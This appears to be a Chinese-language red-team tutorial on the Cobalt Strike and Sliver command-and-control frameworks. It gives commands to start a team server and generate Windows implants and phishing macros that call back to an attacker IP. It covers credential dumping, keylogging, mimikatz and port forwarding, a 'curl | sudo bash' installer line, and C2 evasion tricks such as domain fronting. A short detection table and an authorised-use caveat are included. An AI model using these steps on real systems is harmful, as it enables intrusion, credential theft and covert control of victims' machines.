---
title: C2 框架实战：Cobalt Strike 与 Sliver 深度解析
slug: kali-4-c2框架实战-3c4d5
date: 2026-09-12
visibility: public
tags: Kali Linux, C2, Cobalt Strike, Sliver, 红队, 命令控制, 教程
---

# C2 框架实战：Cobalt Strike 与 Sliver 深度解析

> C2（Command & Control，命令与控制）是红队/后渗透的核心基础设施。本文深度解析两大主流 C2 框架：商业级的 **Cobalt Strike** 与开源免费的 **Sliver**，从部署到上线、从插件到规避。

## 一、C2 是什么

C2 = 攻击者控制受害主机的中枢：

```
攻击者
  │ HTTPS/DNS/自定义协议
  ▼
C2 服务器（Team Server）
  │ beacon（每 60s 心跳）
  ▼
受害主机（Beacon/植入体）
```

## 二、Cobalt Strike（商业）

### 组件结构

```
Team Server（团队服务器）
  ├── 客户端（GUI）
  └── Beacon（木马会话）

监听器类型：HTTP/HTTPS/DNS/SMB
```

### 启动

```bash
# 启动 Team Server（在 Cobalt Strike 目录）
./teamserver 192.168.1.100 yourpassword

# 客户端连接
./cobaltstrike
```

### Beacon 生成（用 Aggressor 脚本或 Cobalt 内置）

```bash
# 生成 HTTPS Beacon（Windows）
Attacks → Packages → Windows Executable (S)
选择 Listener（HTTPS）→ Generate

# 生成宏/脚本（钓鱼用）
Attacks → Packages → HTML Application / MS Office Macro
```

### 常用命令

```
shell whoami                # 执行系统命令
upload file.exe             # 上传文件
download c:\users\...\passwords.txt
execute-assembly mimikatz.exe  # 内存执行
hashdump                    # 抓密码哈希
screenshot                  # 截图
keylogger                   # 键盘记录
```

## 三、Sliver（开源免费 C2）

### 安装

```bash
# Kali 上安装
curl https://sliver.sh/install | sudo bash
sliver
```

### 生成会话（Beacon/Implant）

```
sliver > generate --mtls 192.168.1.100 --os windows --arch amd64 --save .
# 生成 Windows 木马，拷贝到目标机运行

# 监听会话
sliver > https --lhost 0.0.0.0 --lport 443
sliver > http --lhost 0.0.0.0 --lport 80
```

### 常用操作

```
session                  # 列出会话
use <session id>         # 切换
whoami
execute-assembly         # 内存执行 .NET 程序
portfwd add -l 4444 -t 10.10.10.10:3389  # 端口转发
shell                   # 获取交互 shell
```

## 四、C2 通信隐藏技巧

```
1. 域名前置（CDN 前置）：流量伪装成正常 CDN 请求
2. 域前置（Domain Fronting）：用高信誉域名
3. 轮换域名 / 流量特征化
4. 心跳间隔随机化（低延迟隐蔽）
5. 协议伪装：DNS-over-HTTPS、WebSocket、QUIC
```

## 五、C2 的检测与防御

| 检测手段 | 说明 |
|---------|------|
| 行为检测 | 异常心跳间隔、进程注入 |
| 流量分析 | 域名信誉、TLS 指纹（JA3） |
| EDR | 内存扫描、API 调用序列 |
| 网络 | 外联白名单、出站限制 |

> 红队视角：C2 通信尽量模拟正常业务流量；蓝队视角：以上全部。

## 六、合规与注意事项

- C2 框架多被攻击者滥用，**测试只用于授权环境**
- 会话管理：及时清理，不遗留持久化
- 不泄露真实受害数据

## 七、Kali 相关工具

| 工具 | 用途 |
|------|------|
| Cobalt Strike | 商业 C2 |
| Sliver | 开源 C2 |
| Mythic | 跨平台 C2 |
| Havoc | 开源 C2 |
| Merlin | HTTP/2 C2 |
| Covenant | .NET C2 |

## 小结

- C2 是红队"中枢神经"，Beacon 会话是核心
- Cobalt Strike 功能全但昂贵；Sliver 开源免费
- 流量隐蔽（HTTPS/域名前置）决定存活时间
- 红蓝对抗中 C2 检测是热点
- 合规红线：只在授权环境使用

> 下一篇：供应链攻击——从软件依赖到 CI/CD 投毒。